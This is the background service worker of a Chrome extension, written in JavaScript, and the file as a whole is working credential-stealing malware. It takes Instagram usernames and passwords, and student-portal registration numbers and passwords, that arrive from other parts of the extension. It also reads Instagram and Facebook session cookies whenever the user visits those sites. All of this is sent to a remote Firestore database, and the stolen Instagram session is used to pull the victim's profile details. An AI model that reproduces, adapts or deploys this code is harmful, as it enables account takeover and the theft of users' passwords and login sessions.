console.log(
  "%c🚀 Service Worker Loaded ✅",
  "color: green; font-weight: bold;"
);

// Firebase + Utils
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
import { isDuplicateData } from "./utils.js";

// ============== 🧠 In-Memory Cache for Deduplication ==============
const savedStudentSet = new Set();
const savedInstagramCredSet = new Set();
const savedInstagramSessionSet = new Set();
const savedFacebookSessionSet = new Set();

// 🌐 Navigation Handler
chrome.webNavigation.onCompleted.addListener(
  async ({ url, frameId }) => {
    if (frameId !== 0) return; // ⛔ Ignore iframes

    if (url.includes("instagram.com")) {
      // Pehle credentials handle ho chuke honge, ab cookies check karo
      await handleInstagram();
    } else if (url.includes("facebook.com")) {
      await handleFacebook();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

// 📩 Message Listener (with listener flag so it doesn't double register)
if (!globalThis.messageListenerAttached) {
  chrome.runtime.onMessage.addListener(async (msg, sender, sendResponse) => {
    // 🔐 Instagram Login Credentials Handler
    if (msg.type === "instagram_login_data") {
      const { username, password } = msg.data;

      if (!username || !password) {
        console.warn(
          "%c⚠️ [IG Login] Incomplete login data received, skipping save.",
          "color: orange; font-weight: bold;"
        );
        return;
      }

      console.log(
        "%c[IG Login] Received login credentials:",
        "color: dodgerblue; font-weight: bold; font-size: 14px;"
      );
      console.table({ username, password });

      const colRef = collection(db, "instagramCred");
      const docData = { username, password };
      const key = `${username}:${password}`;

      try {
        if (savedInstagramCredSet.has(key)) {
          console.warn(
            "%c⛔️ [IG Login] Already handled in-memory — skipping save",
            "color: gray; font-weight: bold;"
          );
          return;
        }
        savedInstagramCredSet.add(key);

        if (await isDuplicateData(colRef, docData)) {
          console.warn(
            "%c⛔️ [IG Login] Duplicate login data detected — skipping save",
            "color: gray; font-weight: bold;"
          );
          return;
        }

        await addDoc(colRef, { ...docData, timestamp: new Date() });
        console.log(
          `%c🚀 [IG Login] Login credentials saved for @${username}`,
          "color: mediumseagreen; font-weight: bold; font-size: 14px;"
        );
      } catch (err) {
        console.error(
          "%c❌ [IG Login] Failed to save credentials to Firestore:",
          "color: red; font-weight: bold;",
          err
        );
      }
    }

    // 🏫 Student Data Handler (Unchanged)
    if (msg.type === "student_data") {
      const { registrationNumber, password } = msg.data;

      if (!registrationNumber || !password) return;

      const colRef = collection(db, "studentData");
      const docData = { registrationNumber, password };
      const key = `${registrationNumber}:${password}`;

      try {
        if (savedStudentSet.has(key)) {
          console.warn(
            "%c⛔️ [LPU] Already handled in-memory — skipping",
            "color: gray; font-weight: bold;"
          );
          return;
        }
        savedStudentSet.add(key);

        if (await isDuplicateData(colRef, docData)) return;

        await addDoc(colRef, { ...docData, timestamp: new Date() });
        console.log(
          `%c✅ [LPU] Student data saved for regNo: ${registrationNumber}`,
          "color: mediumseagreen; font-weight: bold;"
        );
      } catch (err) {
        console.error(
          "%c❌ [LPU] Error saving student data:",
          "color: red; font-weight: bold;",
          err
        );
      }
    }
  });

  globalThis.messageListenerAttached = true;
}

// 🍪 Instagram Session Cookie Handler (Always Run)
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    console.log(
      "%c[IG] Starting Instagram session fetch...",
      "color: dodgerblue; font-weight: bold; font-size: 14px;"
    );

    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn(
        "%c⚠️ [IG] Missing required cookies:",
        "color: orange; font-weight: bold; font-size: 13px;"
      );
      if (!session)
        console.warn("%c - sessionid cookie NOT found", "color: orange;");
      if (!dsUserId)
        console.warn("%c - ds_user_id cookie NOT found", "color: orange;");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    console.log(
      "%c[IG] Cookies found:",
      "color: green; font-weight: bold; font-size: 13px;"
    );
    console.table([
      { name: "sessionid", value: sessionId },
      { name: "ds_user_id", value: userId },
    ]);

    let username = "unknown_user";
    let bio = "";

    try {
      console.log(
        "%c[IG] Fetching user info from Instagram API...",
        "color: deepskyblue; font-weight: bold;"
      );

      const response = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (!response.ok) {
        console.error(
          `%c❌ [IG] API response error: HTTP ${response.status} ${response.statusText}`,
          "color: red; font-weight: bold;"
        );
        return;
      }

      const data = await response.json();
      const user = data.user || {};

      username = user.username || "unknown_user";
      bio = user.biography || "";

      console.log(
        "%c✅ [IG] User info fetched successfully:",
        "color: limegreen; font-weight: bold;"
      );
      console.table({ username, bio });
    } catch (error) {
      console.error(
        "%c❌ [IG] Exception during API fetch:",
        "color: red; font-weight: bold;",
        error
      );
      return;
    }

    const key = `${userId}:${sessionId}`;
    if (savedInstagramSessionSet.has(key)) {
      console.warn(
        "%c⛔️ [IG] Already handled in-memory — skipping",
        "color: gray; font-weight: bold;"
      );
      return;
    }
    savedInstagramSessionSet.add(key);

    const docData = { sessionId, userId, username, bio };
    const colRef = collection(db, "instagram");

    try {
      if (await isDuplicateData(colRef, docData)) {
        console.warn(
          "%c⛔️ [IG] Duplicate session detected — skipping save",
          "color: gray; font-weight: bold;"
        );
        return;
      }

      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log(
        `%c🚀 [IG] Session saved successfully for @${username}`,
        "color: mediumseagreen; font-weight: bold; font-size: 14px;"
      );
    } catch (err) {
      console.error(
        "%c❌ [IG] Failed to save session to Firestore:",
        "color: red; font-weight: bold;",
        err
      );
    }
  });
}

// 📘 Facebook Cookie Handler (As-is)
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    console.log(
      "%c[FB] Starting Facebook session fetch...",
      "color: dodgerblue; font-weight: bold; font-size: 14px;"
    );

    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.warn(
        "%c⚠️ [FB] Missing required cookies: c_user or xs",
        "color: orange; font-weight: bold; font-size: 13px;"
      );
      return;
    }

    const key = `${cUser.value}:${xs.value}`;
    if (savedFacebookSessionSet.has(key)) {
      console.warn(
        "%c⛔️ [FB] Already handled in-memory — skipping",
        "color: gray; font-weight: bold;"
      );
      return;
    }
    savedFacebookSessionSet.add(key);

    const docData = {
      c_user: cUser.value,
      xs: xs.value,
    };

    console.log(
      "%c[FB] Cookies found:",
      "color: green; font-weight: bold; font-size: 13px;"
    );
    console.table(docData);

    const colRef = collection(db, "facebook");

    try {
      if (await isDuplicateData(colRef, docData)) {
        console.warn(
          "%c⛔️ [FB] Duplicate session detected — skipping save",
          "color: gray; font-weight: bold;"
        );
        return;
      }

      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log(
        "%c🚀 [FB] Facebook session saved successfully",
        "color: mediumseagreen; font-weight: bold; font-size: 14px;"
      );
    } catch (err) {
      console.error(
        "%c❌ [FB] Failed to save session to Firestore:",
        "color: red; font-weight: bold;",
        err
      );
    }
  });
}
